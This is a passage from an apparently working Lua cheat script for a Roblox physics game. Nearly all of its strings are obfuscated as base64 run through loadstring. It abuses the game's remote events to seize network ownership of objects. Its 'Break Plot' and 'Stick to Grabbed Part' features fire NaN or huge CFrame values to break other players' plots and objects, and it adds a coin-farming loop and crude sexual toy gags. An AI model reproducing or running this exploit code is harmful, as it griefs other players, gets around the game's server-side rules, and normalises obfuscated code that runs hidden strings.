        x = sin(a) + 2 * sin(2 * a)
        y = cos(a) - 2 * cos(2 * a)
        z = -sin(3 * a)
        sc = r / 3
        return Vector3.new(x * sc, y * sc + h, z * sc)
    end

    Shapes[loadstring(base64decode("S2xlaW4gQm90dGxlIFNsaWNl"))()] = function(xVec0uwV, n, t, r, h, sp)
        u = baseAngle(xVec0uwV, n, t, sp)
        v = baseAngle(xVec0uwV, math.max(n, 1), t * 2, sp)
        a = r * 0.3
        x = (a + a * cos(v)) * cos(u)
        y = (a + a * cos(v)) * sin(u)
        z = a * sin(v) + sin(t * sp + xVec0uwV * 0.2) * 2
        return Vector3.new(x, y + h, z)
    end

    Shapes.Harmonograph = function(xVec0uwV, n, t, r, h, sp)
        frac = xVec0uwV / n
        decay = math.exp(-frac * 0.5)
        f1, f2, f3, f4 = 3, 2, 3, 2
        p1, p2 = math.pi / 4, math.pi / 6
        a = frac * TAU * 8 + t * sp
        x = r * decay * (sin(f1 * a + p1) + sin(f2 * a))
        z = r * decay * (sin(f3 * a + p2) + sin(f4 * a))
        return Vector3.new(x * 0.5, h + sin(t * sp + frac * 12) * 1.5, z * 0.5)
    end

    function GetShapeOffset(index, total, t, cfg)
        fn = Shapes[cfg.CurrentShape]
        if fn then
            return fn(index, total, t, cfg.Radius, cfg.Height, cfg.Speed)
        end
        a = (index / total) * TAU + t * cfg.Speed
        return Vector3.new(cos(a) * cfg.Radius, cfg.Height, sin(a) * cfg.Radius)
    end

    SparklerGroup:CreateButton({
        Name = loadstring(base64decode("U3luY2hyb25pemUgQWxsIFNwYXJrbGVycw=="))(),
        Callback = function()
            for _, obj in ipairs(workspace:GetDescendants()) do
                if obj.Name:find(loadstring(base64decode("RmlyZXdvcmtTcGFya2xlcg=="))()) then
                    SetupPhysics(obj, activeSparklers)
                end
            end
        end
    })

    SparklerGroup:CreateButton({
        Name = loadstring(base64decode("VW5zeW5jaHJvbml6ZSBBbGwgU3BhcmtsZXJz"))(),
        Callback = function()
            activeSparklers = {}
        end
    })

    SparklerGroup:CreateSlider({
        Name = loadstring(base64decode("SGVpZ2h0IE9mZnNldA=="))(),
        Default = 5,
        Min = -20,
        Max = 100000,
        Callback = function(v)
            sparklerConfig.Height = v
        end
    })

    SparklerGroup:CreateSlider({
        Name = loadstring(base64decode("U2hhcGUgUmFkaXVz"))(),
        Default = 15,
        Min = 2,
        Max = 100000,
        Callback = function(v)
            sparklerConfig.Radius = v
        end
    })

    SparklerGroup:CreateSlider({
        Name = loadstring(base64decode("Um90YXRpb24gU3BlZWQ="))(),
        Default = 2,
        Min = 0,
        Max = 100000,
        Callback = function(v)
            sparklerConfig.Speed = v
        end
    })

    SparklerGroup:CreateDropdown({
        Name = loadstring(base64decode("U2VsZWN0IFNoYXBl"))(),
        Items = shapeOptions,
        Default = loadstring(base64decode("UGxhbmV0"))(),
        Callback = function(v)
            sparklerConfig.CurrentShape = v
        end
    })

    RunService.RenderStepped:Connect(function()
        char = LocalPlayer.Character
        targetRoot = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not targetRoot then return end

        t = tick()
        prediction = targetRoot.AssemblyLinearVelocity * 0.12
        rot = targetRoot.CFrame.Rotation

        for xVec0uwV = #activeSparklers, 1, -1 do
            obj = activeSparklers[xVec0uwV]
            if obj and obj.Parent then
                main = obj:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) and obj or obj.PrimaryPart
                bp = main and main:FindFirstChild(loadstring(base64decode("VG95Qm9keVBvcw=="))())
                bg = main and main:FindFirstChild(loadstring(base64decode("VG95Qm9keUd5cm8="))())
                if bp and bg then
                    offset = GetShapeOffset(xVec0uwV, #activeSparklers, t, sparklerConfig)
                    bp.Position = targetRoot.Position + prediction + (rot * offset)
                    bg.CFrame = CFrame.new(main.Position, targetRoot.Position + prediction)
                end
            else
                table.remove(activeSparklers, xVec0uwV)
            end
        end
    end)
end

do

    local CoconutEnabled = false
    local CoconutBodyEnabled = false
    local CoconutAmount = 10
    local CoconutDamping = 100

    SparklerGroup:CreateToggle({
        Name = loadstring(base64decode("Q29jb251dCBQZW5pcw=="))(),
        Tooltip = loadstring(base64decode("TWFrZXMgYSBkaWNrIG91dCBvZiBjb2NvbnV0cw=="))(),
        Default = false,
        Callback = function(Value)
            CoconutEnabled = Value

            if Value then
                task.spawn(function()
                    local Me = game:GetService(loadstring(base64decode("UGxheWVycw=="))()).LocalPlayer
                    local ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
                    local SetNetworkOwner = ReplicatedStorage.GrabEvents.SetNetworkOwner
                    local SpawnToy = ReplicatedStorage.MenuToys.SpawnToyRemoteFunction
                    local DestroyToy = ReplicatedStorage.MenuToys.DestroyToy
                    local Offsets = {
                        [1] = CFrame.new(-0.45, -1.2, -0.7),
                        [2] = CFrame.new(0.45, -1.2, -0.7),
                        [3] = CFrame.new(0, -1, 0.8),
                    }
                    local Coconuts = {}

                    while CoconutEnabled do
                        local Character = Me.Character
                        local Root = Character and Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())

                        if not Root then
                            task.wait(0.1)
                            continue
                        end

                        local Folder = workspace:FindFirstChild(Me.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())

                        if not Folder then
                            task.wait(0.1)
                            continue
                        end

                        table.clear(Coconuts)

                        for _, Toy in ipairs(Folder:GetChildren()) do
                            if Toy.Name == loadstring(base64decode("Rm9vZENvY29udXQ="))() then
                                table.insert(Coconuts, Toy)
                            end
                        end

                        if #Coconuts < (CoconutAmount + 2) then
                            task.spawn(function()
                                SpawnToy:InvokeServer(loadstring(base64decode("Rm9vZENvY29udXQ="))(), Root.CFrame * CFrame.new(-5, 0, 10), Vector3.zero)
                            end)
                        end

                        for xVec0uwV, Coconut in ipairs(Coconuts) do
                            local Part = Coconut:FindFirstChild(loadstring(base64decode("U291bmRQYXJ0"))())
                            local HoldPart = Coconut:FindFirstChild(loadstring(base64decode("SG9sZFBhcnQ="))())
                            local Rigid = HoldPart and HoldPart:FindFirstChild(loadstring(base64decode("UmlnaWRDb25zdHJhaW50"))())
                            local PartOwner = Part and Part:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))())

                            if Part and HoldPart and Rigid then
                                if PartOwner and PartOwner.Value == Me.Name then
                                    if xVec0uwV <= 2 then
                                        Part.CFrame = Root.CFrame * Offsets[xVec0uwV] * CFrame.new(Root.Velocity / CoconutDamping)
                                    else
                                        Part.CFrame = Root.CFrame * Offsets[3] * CFrame.new(Root.Velocity / CoconutDamping) * CFrame.new(0, 0, Offsets[3].Z - (xVec0uwV + 0.2))
                                    end

                                    Part.Velocity = Vector3.zero
                                else
                                    SetNetworkOwner:FireServer(Part, Part.CFrame)
                                end
                                if Rigid.Attachment1 then
                                    DestroyToy:FireServer(Coconut)
                                end

                                for _, PartObj in ipairs(Coconut:GetChildren()) do
                                    if PartObj:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                                        PartObj.CanCollide = false
                                        PartObj.CanQuery = false

                                        if PartObj.Transparency ~= 1 then
                                            PartObj.Transparency = 0
                                        end
                                    end
                                end
                            end
                        end

                        task.wait(0.01)
                    end
                end)
            end
        end
    })

    SparklerGroup:CreateToggle({
        Name = loadstring(base64decode("Q29jb251dCBCb29icyBhbmQgQXNz"))(),
        Tooltip = loadstring(base64decode("UGxhY2VzIGNvY29udXRzIG9uIHlvdXIgY2hlc3QgYW5kIGFzcw=="))(),
        Default = false,
        Callback = function(Value)
            CoconutBodyEnabled = Value

            if Value then
                task.spawn(function()
                    local Me = game:GetService(loadstring(base64decode("UGxheWVycw=="))()).LocalPlayer
                    local ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
                    local SetNetworkOwner = ReplicatedStorage.GrabEvents.SetNetworkOwner
                    local SpawnToy = ReplicatedStorage.MenuToys.SpawnToyRemoteFunction
                    local DestroyToy = ReplicatedStorage.MenuToys.DestroyToy
                    local Coconuts = {}

                    while CoconutBodyEnabled do
                        local Character = Me.Character
                        local Root = Character and Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())

                        if not Root then
                            task.wait(0.1)
                            continue
                        end

                        local Folder = workspace:FindFirstChild(Me.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())

                        if not Folder then
                            task.wait(0.1)
                            continue
                        end

                        table.clear(Coconuts)

                        for _, Toy in ipairs(Folder:GetChildren()) do
                            if Toy.Name == loadstring(base64decode("Rm9vZENvY29udXQ="))() then
                                table.insert(Coconuts, Toy)
                            end
                        end

                        if #Coconuts < 4 then
                            for _ = 1, 4 - #Coconuts do
                                task.spawn(function()
                                    SpawnToy:InvokeServer(loadstring(base64decode("Rm9vZENvY29udXQ="))(), Root.CFrame * CFrame.new(-5, 0, 10), Vector3.zero)
                                end)
                            end
                        end

                        for xVec0uwV = 1, math.min(4, #Coconuts) do
                            local Coconut = Coconuts[xVec0uwV]
                            local Part = Coconut:FindFirstChild(loadstring(base64decode("U291bmRQYXJ0"))())
                            local HoldPart = Coconut:FindFirstChild(loadstring(base64decode("SG9sZFBhcnQ="))())
                            local Rigid = HoldPart and HoldPart:FindFirstChild(loadstring(base64decode("UmlnaWRDb25zdHJhaW50"))())
                            local PartOwner = Part and Part:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))())

                            if Part and HoldPart and Rigid then
                                if PartOwner and PartOwner.Value == Me.Name then
                                    local TargetCF

                                    if xVec0uwV == 1 then
                                        TargetCF = Root.CFrame * CFrame.new(-0.4, 0.3, -0.55)
                                    elseif xVec0uwV == 2 then
                                        TargetCF = Root.CFrame * CFrame.new(0.4, 0.3, -0.55)
                                    elseif xVec0uwV == 3 then
                                        TargetCF = Root.CFrame * CFrame.new(-0.35, -1.1, 0.45)
                                    else
                                        TargetCF = Root.CFrame * CFrame.new(0.35, -1.1, 0.45)
                                    end

                                    Part.CFrame = TargetCF
                                    Part.Velocity = Vector3.zero
                                else
                                    SetNetworkOwner:FireServer(Part, Part.CFrame)
                                end
                                if Rigid.Attachment1 then
                                    DestroyToy:FireServer(Coconut)
                                end

                                for _, PartObj in ipairs(Coconut:GetChildren()) do
                                    if PartObj:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                                        PartObj.CanCollide = false
                                        PartObj.CanQuery = false

                                        if PartObj.Transparency ~= 1 then
                                            PartObj.Transparency = 0
                                        end
                                    end
                                end
                            end
                        end

                        task.wait(0.01)
                    end
                end)
            end
        end
    })

    SparklerGroup:CreateSlider({
        Name = loadstring(base64decode("Q29jb251dCBBbW91bnQ="))(),
        Default = 10,
        Min = 3,
        Max = 25,
        Callback = function(v)
            CoconutAmount = v
        end
    })

    SparklerGroup:CreateSlider({
        Name = loadstring(base64decode("RGFtcGluZw=="))(),
        Default = 100,
        Min = 1,
        Max = 500,
        Callback = function(v)
            CoconutDamping = v
        end
    })
end

local MiscGroup = Tabs.Misc:CreateBlock({Name = loadstring(base64decode("QnJlYWtz"))(), Side = loadstring(base64decode("TGVmdA=="))()})

do
    local ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
    local Workspace = game:GetService(loadstring(base64decode("V29ya3NwYWNl"))())
    local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())

    local LocalPlayer = Players.LocalPlayer

    local SpawnToyRemote = ReplicatedStorage:WaitForChild(loadstring(base64decode("TWVudVRveXM="))()):WaitForChild(loadstring(base64decode("U3Bhd25Ub3lSZW1vdGVGdW5jdGlvbg=="))())
    local DestroyToy = ReplicatedStorage:WaitForChild(loadstring(base64decode("TWVudVRveXM="))()):WaitForChild(loadstring(base64decode("RGVzdHJveVRveQ=="))())
    local SetNetworkOwner = ReplicatedStorage:WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))()):WaitForChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))())
    local DestroyGrabLine = ReplicatedStorage:WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))()):WaitForChild(loadstring(base64decode("RGVzdHJveUdyYWJMaW5l"))())
    local StickyPartEvent = ReplicatedStorage:WaitForChild(loadstring(base64decode("UGxheWVyRXZlbnRz"))()):WaitForChild(loadstring(base64decode("U3RpY2t5UGFydEV2ZW50"))())

    local currentGrabbedHighlight = nil

    getgenv().getCurrentToyFolder2 = getgenv().getCurrentToyFolder2 or function()
        local inPlot = LocalPlayer:FindFirstChild(loadstring(base64decode("SW5QbG90"))())
        if inPlot and inPlot.Value then
            local plots = Workspace:FindFirstChild(loadstring(base64decode("UGxvdHM="))())
            if plots then
                for xVec0uwV = 1, 5 do
                    local p = plots:FindFirstChild(loadstring(base64decode("UGxvdA=="))()..xVec0uwV)
                    if p and p:FindFirstChild(loadstring(base64decode("UGxvdFNpZ24="))()) then
                        local sign = p.PlotSign
                        for _, name in ipairs({loadstring(base64decode("VGhpc1Bsb3RzT3duZXJz"))(),loadstring(base64decode("VGhpc1Bsb3RzT3duZXI="))(),loadstring(base64decode("VGhpc1Bsb3RPd25lcnM="))()}) do
                            local c = sign:FindFirstChild(name)
                            if c then
                                local owner = c:IsA(loadstring(base64decode("U3RyaW5nVmFsdWU="))()) and c or c:FindFirstChildOfClass(loadstring(base64decode("U3RyaW5nVmFsdWU="))())
                                if owner and owner.Value == LocalPlayer.Name then
                                    return Workspace.PlotItems:FindFirstChild(loadstring(base64decode("UGxvdA=="))()..xVec0uwV)
                                end
                            end
                        end
                    end
                end
            end
        end
        return Workspace:FindFirstChild(LocalPlayer.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
    end

    local function GetFolder()
        return getgenv().getCurrentToyFolder2()
    end

    local function HideShuriken(shuriken)
        pcall(function()
            for _, v in ipairs(shuriken:GetDescendants()) do
                if v:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                    v.CanTouch = false
                    v.CanCollide = false
                    v.CanQuery = false
                    v.Transparency = 1
                end
            end
        end)
    end

    local function WaitForNewShuriken(timeout, activeCheck, existing)
        timeout = timeout or 5
        local folder = GetFolder()
        if not folder then return nil end

        local result = nil
        local conn = folder.ChildAdded:Connect(function(child)
            if child.Name == loadstring(base64decode("VG9vbFBlbmNpbA=="))() and not result and not (existing and existing[child]) then
                result = child
            end
        end)

        local start = tick()
        while not result and (tick() - start < timeout) do
            if activeCheck and not activeCheck() then
                conn:Disconnect()
                return nil
            end
            task.wait()
        end
        conn:Disconnect()
        return result
    end

    local function SpawnShuriken()
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not hrp then return end
        task.spawn(function()
            local cf = hrp.CFrame * CFrame.Angles(-0.605224, -0.321753, 0)
            SpawnToyRemote:InvokeServer(loadstring(base64decode("VG9vbFBlbmNpbA=="))(), cf, Vector3.new(0, 25.02, 0))
        end)
    end

    local function CreateAndOwnShuriken(activeCheck)
        local folder = GetFolder()
        local existing = {}
        if folder then
            for _, v in ipairs(folder:GetChildren()) do
                if v.Name == loadstring(base64decode("VG9vbFBlbmNpbA=="))() then existing[v] = true end
            end
        end

        while activeCheck == nil or activeCheck() do
            SpawnShuriken()
            local shuriken = WaitForNewShuriken(4, activeCheck, existing)
            if not shuriken then
                if activeCheck and not activeCheck() then return nil end
                task.wait(0.25)
                continue
            end

            task.wait(0.08)
            HideShuriken(shuriken)

            local soundPart = shuriken:FindFirstChild(loadstring(base64decode("U291bmRQYXJ0"))()) or shuriken:FindFirstChildOfClass(loadstring(base64decode("QmFzZVBhcnQ="))())
            if not soundPart then
                pcall(function() DestroyToy:FireServer(shuriken) end)
                task.wait(0.2)
                continue
            end

            SetNetworkOwner:FireServer(soundPart, soundPart.CFrame)
            task.wait(0.12)

            if activeCheck and not activeCheck() then
                pcall(function() DestroyToy:FireServer(shuriken) end)
                return nil
            end

            local owner = soundPart:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))())
            if owner and owner.Value == LocalPlayer.Name then
                return shuriken
            else
                pcall(function() DestroyToy:FireServer(shuriken) end)
                task.wait(0.25)
            end
        end
        return nil
    end

    local function GetStickyPart(shuriken)
        return shuriken:FindFirstChild(loadstring(base64decode("U3RpY2t5UGFydA=="))()) or shuriken:FindFirstChildOfClass(loadstring(base64decode("QmFzZVBhcnQ="))())
    end

    local function StickShurikenToTarget(shuriken, target, cf)
        local stickyPart = GetStickyPart(shuriken)
        if not stickyPart or not target then return end
        pcall(function()
            DestroyGrabLine:FireServer(shuriken:FindFirstChildOfClass(loadstring(base64decode("QmFzZVBhcnQ="))()))
        end)
        pcall(function()
            StickyPartEvent:FireServer(table.unpack({
                [1] = stickyPart,
                [2] = target,
                [3] = cf,
            }))
        end)
    end

    local function GetGrabbedPart()
        local g = Workspace:FindFirstChild(loadstring(base64decode("R3JhYlBhcnRz"))())
        if not g then return nil end
        local gp = g:FindFirstChild(loadstring(base64decode("R3JhYlBhcnQ="))())
        if not gp then return nil end
        local weld = gp:FindFirstChild(loadstring(base64decode("V2VsZENvbnN0cmFpbnQ="))()) or gp:FindFirstChild(loadstring(base64decode("V2VsZA=="))())
        if not weld then return nil end
        return weld.Part1 or nil
    end

    local function StickToGrabbedPartOnce()
        local grabbed = GetGrabbedPart()
        if not grabbed then
            if notify then notify(loadstring(base64decode("U3lzdGVt"))(), loadstring(base64decode("Tm90aGluZyBncmFiYmVkIQ=="))(), 3) end
            return
        end

        if currentGrabbedHighlight then
            pcall(function() currentGrabbedHighlight:Destroy() end)
            currentGrabbedHighlight = nil
        end

        local highlight = Instance.new(loadstring(base64decode("U2VsZWN0aW9uQm94"))())
        highlight.Adornee = grabbed
        highlight.Color3 = Color3.fromRGB(0, 250, 0)
        highlight.LineThickness = 0.03
        highlight.SurfaceTransparency = 0.8
        highlight.SurfaceColor3 = Color3.fromRGB(0, 250, 0)
        highlight.Parent = grabbed
        currentGrabbedHighlight = highlight

        local shuriken = CreateAndOwnShuriken(function() return true end)
        if not shuriken then
            pcall(function() highlight:Destroy() end)
            currentGrabbedHighlight = nil
            return
        end

        -- Left as NaN CFrame, assuming grabbed breaking uses math errors to clip
        StickShurikenToTarget(shuriken, grabbed, CFrame.new(0/0, 0/0, 0/0))
        HideShuriken(shuriken)

        if notify then notify(loadstring(base64decode("U3lzdGVt"))(), loadstring(base64decode("U3R1Y2sgdG86IA=="))() .. grabbed.Name, 3) end

        task.delay(3, function()
            if currentGrabbedHighlight and currentGrabbedHighlight == highlight then
                pcall(function() highlight:Destroy() end)
                currentGrabbedHighlight = nil
            end
        end)
    end

    -- ==========================================================
    -- XOCU UI INTEGRATION (Trimmed)
    -- ==========================================================

    MiscGroup:CreateButton({
        Name = loadstring(base64decode("U3RpY2sgdG8gR3JhYmJlZCBQYXJ0"))(),
        Callback = function()
            task.spawn(StickToGrabbedPartOnce)
        end
    })

    MiscGroup:CreateButton({
        Name = loadstring(base64decode("RmluZCBDbG9zZXN0IEJhc2VHcm91bmQ="))(),
        Callback = function()
            local char = LocalPlayer.Character
            local hrp = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
            if not hrp then
                if notify then notify(loadstring(base64decode("U3lzdGVt"))(), loadstring(base64decode("Tm8gY2hhcmFjdGVyIQ=="))(), 3) end
                return
            end

            local baseGround = Workspace:FindFirstChild(loadstring(base64decode("TWFw"))()) and Workspace.Map:FindFirstChild(loadstring(base64decode("QmFzZUdyb3VuZA=="))())
            if not baseGround then
                if notify then notify(loadstring(base64decode("U3lzdGVt"))(), loadstring(base64decode("QmFzZUdyb3VuZCBub3QgZm91bmQh"))(), 3) end
                return
            end

            local children = baseGround:GetChildren()
            local closestPart = nil
            local closestIndex = nil
            local closestDist = math.huge
            local myPos = hrp.Position

            for xVec0uwV, child in ipairs(children) do
                if child:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                    local dist = (child.Position - myPos).Magnitude
                    if dist < closestDist then
                        closestDist = dist
                        closestPart = child
                        closestIndex = xVec0uwV
                    end
                end
            end

            if not closestPart then
                if notify then notify(loadstring(base64decode("U3lzdGVt"))(), loadstring(base64decode("Tm8gQmFzZVBhcnQgZm91bmQgaW4gQmFzZUdyb3VuZCE="))(), 3) end
                return
            end

            local pos = closestPart.Position
            local info = string.format(
                loadstring(base64decode("TmFtZTogJXNcbkluZGV4OiBbJWRdXG5Qb3NpdGlvbjogVmVjdG9yMy5uZXcoJS4yZiwgJS4yZiwgJS4yZilcbkRpc3RhbmNlOiAlLjJmIHN0dWRzXG5BY2Nlc3M6IHdvcmtzcGFjZS5NYXAuQmFzZUdyb3VuZDpHZXRDaGlsZHJlbigpWyVkXQ=="))(),
                closestPart.Name,
                closestIndex,
                pos.X, pos.Y, pos.Z,
                closestDist,
                closestIndex
            )

            pcall(function()
                if setclipboard then
                    setclipboard(info)
                elseif toclipboard then
                    toclipboard(info)
                end
            end)

            pcall(function()
                local highlight = Instance.new(loadstring(base64decode("SGlnaGxpZ2h0"))())
                highlight.Name = loadstring(base64decode("Q2xvc2VzdEJhc2VHcm91bmRFU1A="))()
                highlight.Adornee = closestPart
                highlight.FillColor = Color3.fromRGB(0, 255, 0)
                highlight.OutlineColor = Color3.fromRGB(255, 255, 0)
                highlight.FillTransparency = 0.4
                highlight.OutlineTransparency = 0
                highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                highlight.Parent = closestPart

                local billboard = Instance.new(loadstring(base64decode("QmlsbGJvYXJkR3Vp"))())
                billboard.Name = loadstring(base64decode("Q2xvc2VzdEJhc2VHcm91bmRMYWJlbA=="))()
                billboard.Adornee = closestPart
                billboard.Size = UDim2.new(0, 300, 0, 80)
                billboard.StudsOffset = Vector3.new(0, 5, 0)
                billboard.AlwaysOnTop = true
                billboard.Parent = closestPart

                local label = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))())
                label.Size = UDim2.new(1, 0, 1, 0)
                label.BackgroundTransparency = 1
                label.Text = string.format(loadstring(base64decode("WyVkXSAlc1xuJS4wZiBzdHVkcyBhd2F5"))(), closestIndex, closestPart.Name, closestDist)
                label.TextColor3 = Color3.fromRGB(0, 255, 0)
                label.TextStrokeTransparency = 0
                label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
                label.Font = Enum.Font.GothamBold
                label.TextScaled = true
                label.Parent = billboard

                local att0 = Instance.new(loadstring(base64decode("QXR0YWNobWVudA=="))(), hrp)
                local att1 = Instance.new(loadstring(base64decode("QXR0YWNobWVudA=="))(), closestPart)

                local beam = Instance.new(loadstring(base64decode("QmVhbQ=="))())
                beam.Attachment0 = att0
                beam.Attachment1 = att1
                beam.Color = ColorSequence.new(Color3.fromRGB(0, 255, 0), Color3.fromRGB(255, 255, 0))
                beam.Width0 = 0.5
                beam.Width1 = 0.5
                beam.FaceCamera = true
                beam.LightEmission = 1
                beam.Transparency = NumberSequence.new(0)
                beam.Parent = hrp

                task.delay(8, function()
                    if highlight then highlight:Destroy() end
                    if billboard then billboard:Destroy() end
                    if beam then beam:Destroy() end
                    if att0 then att0:Destroy() end
                    if att1 then att1:Destroy() end
                end)
            end)

            if notify then notify(loadstring(base64decode("U3lzdGVt"))(), loadstring(base64decode("Q2xvc2VzdDogWw=="))() .. closestIndex .. loadstring(base64decode("XSA="))() .. closestPart.Name .. loadstring(base64decode("IC0gY29waWVkIQ=="))(), 5) end
        end
    })
end
do
    -- Ensure your block is created properly
    local MiscGroup = Tabs.Misc:CreateBlock({Name = loadstring(base64decode("UGxvdHM="))(), Side = loadstring(base64decode("UmlnaHQ="))()})

    local SelectedPlot = loadstring(base64decode("MQ=="))()
    local PlotOptions = {loadstring(base64decode("UGxvdDEgKEdyZWVuKQ=="))(), loadstring(base64decode("UGxvdDIgKFBpbmsp"))(), loadstring(base64decode("UGxvdDMgKFB1cnBsZSk="))(), loadstring(base64decode("UGxvdDQgKEJsdWUp"))(), loadstring(base64decode("UGxvdDUgKFllbGxvdyk="))()}

    -- Plot Selection Dropdown (Using CreateDropdown instead of AddDropdown)
    MiscGroup:CreateDropdown({
        Name = loadstring(base64decode("U2VsZWN0IFBsb3Q="))(),
        Flag = loadstring(base64decode("UGxvdEJyZWFrZXJfU2VsZWN0UGxvdA=="))(),
        Items = PlotOptions,
        Default = loadstring(base64decode("UGxvdDEgKEdyZWVuKQ=="))(),
        Callback = function(Value)
            SelectedPlot = Value:match(loadstring(base64decode("UGxvdCglZCk="))()) or loadstring(base64decode("MQ=="))()
        end
    })

    -- Helper Functions
    local function getHRP()
        if Player.Character and Player.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) then
            return Player.Character.HumanoidRootPart
        else
            local character = Player.CharacterAdded:Wait()
            return character:WaitForChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        end
    end

    local function getOrCreateShuriken()
        local playersInPlots = Workspace:FindFirstChild(loadstring(base64decode("UGxvdEl0ZW1z"))()) and Workspace.PlotItems:FindFirstChild(loadstring(base64decode("UGxheWVyc0luUGxvdHM="))())
        if playersInPlots and playersInPlots:FindFirstChild(Player.Name) then
            if notify then notify(loadstring(base64decode("QnJlYWsgUGxvdA=="))(), loadstring(base64decode("WW91IEFyZSBJbiBzYWZlIHpvbmUh"))(), 3) end
            return nil
        end
        
        local inv = Workspace:FindFirstChild(Player.Name..loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
        if not inv then return nil end
        
        local myHRP = getHRP()
        for _, obj in pairs(inv:GetChildren()) do
            if (obj.Name == loadstring(base64decode("TmluamFTaHVyaWtlbg=="))() or obj.Name == loadstring(base64decode("Tm9jbGlwcGVk"))()) and obj:FindFirstChild(loadstring(base64decode("U3RpY2t5UGFydA=="))()) and obj:FindFirstChild(loadstring(base64decode("U291bmRQYXJ0"))()) then
                if myHRP and (obj.StickyPart.Position - myHRP.Position).Magnitude <= 12 then
                    return obj
                end
            end
        end
        
        local currentHRP = getHRP()
        if not currentHRP then return nil end
        
        local toyAdded
        local shur = nil
        toyAdded = inv.ChildAdded:Connect(function(child)
            if child.Name == loadstring(base64decode("TmluamFTaHVyaWtlbg=="))() then
                shur = child
                toyAdded:Disconnect()
            end
        end)
        
        RS.MenuToys.SpawnToyRemoteFunction:InvokeServer(loadstring(base64decode("TmluamFTaHVyaWtlbg=="))(), currentHRP.CFrame * CFrame.new(5, 8, 20), Vector3.new(0, 0, 0))
        
        local startTime = tick()
        repeat
            if shur and shur:FindFirstChild(loadstring(base64decode("U3RpY2t5UGFydA=="))()) and shur:FindFirstChild(loadstring(base64decode("U291bmRQYXJ0"))()) then
                return shur
            end
            task.wait(0.01)
        until tick() - startTime > 0.1
        
        return inv:FindFirstChild(loadstring(base64decode("TmluamFTaHVyaWtlbg=="))())
    end

    -- Plot Breaker Execution Button (Using CreateButton instead of AddButton)
    MiscGroup:CreateButton({
        Name = loadstring(base64decode("QnJlYWsgUGxvdCBbU2h1cmlrZW5d"))(),
        Flag = loadstring(base64decode("UGxvdEJyZWFrZXJfRXhlY3V0ZQ=="))(),
        Callback = function()
            local shur = getOrCreateShuriken()
            if not shur then return end
            
            local soundPart = shur:FindFirstChild(loadstring(base64decode("U291bmRQYXJ0"))())
            local stickyPart = shur:FindFirstChild(loadstring(base64decode("U3RpY2t5UGFydA=="))())
            if not stickyPart then return end
            
            if soundPart then
                local setOwner = RS:WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))()):WaitForChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))())
                for xVec0uwV = 1, 20 do
                    setOwner:FireServer(soundPart, soundPart.CFrame)
                    if soundPart:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))()) and soundPart.PartOwner.Value == Player.Name then break end
                end
            end
            
            for _, obj in pairs(shur:GetChildren()) do
                if obj:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                    obj.CanTouch = false; obj.CanCollide = false; obj.CanQuery = false
                    if obj.Transparency == 0 then obj.Transparency = 1 end
                end
            end
            shur.Name = loadstring(base64decode("Tm9jbGlwcGVk"))()
            
            local plot = Workspace.Plots:FindFirstChild(loadstring(base64decode("UGxvdA=="))()..SelectedPlot)
            if not plot then return end
            local plotArea = plot:FindFirstChild(loadstring(base64decode("UGxvdEFyZWE="))())
            if not plotArea then return end
            
            RS.PlayerEvents.StickyPartEvent:FireServer(stickyPart, plotArea, CFrame.new(1099511627776, 1099511627776, 1099511627776, 1, 0, 0, 0, 1, 0, 0, 0, 1))
        end
    })
end

local SlotsFolder = workspace:WaitForChild('Slots')
local SlotsScreen = SlotsFolder:WaitForChild('Slots')
local SlotGui = SlotsScreen:WaitForChild('Screen'):WaitForChild('SlotGui')
local TimeTextObj = SlotGui:WaitForChild('TimeLeftFrame'):WaitForChild('TimeText')
local slotHandle = workspace.Slots.Slots.SlotHandle.Handle
local targetTime = '0:00'
local farmingActive = false
local slotTeleportPosition = Vector3.new(-224.941177, 91.364975, 425.75116)
local savedCFrame = nil

local FarmGroup = Tabs.Misc:CreateBlock({Name = loadstring(base64decode("RmFybSBDb2lucw=="))(), Side = loadstring(base64decode("UmlnaHQ="))()})

local function updateTimeLabel()
    pcall(function()
        if TimeTextObj then
            Library:Notify({
                Title = loadstring(base64decode("U2xvdCBUaW1l"))(),
                Content = loadstring(base64decode("VGltZTog"))() .. TimeTextObj.Text,
                Duration = 1
            })
        end
    end)
end

task.spawn(function()
    while task.wait(1) do
        if farmingActive and TimeTextObj then
            pcall(function()
                updateTimeLabel()
            end)
        end
    end
end)

function farmLoop()
    while farmingActive do
        task.wait(1)

        local char = LocalPlayer.Character
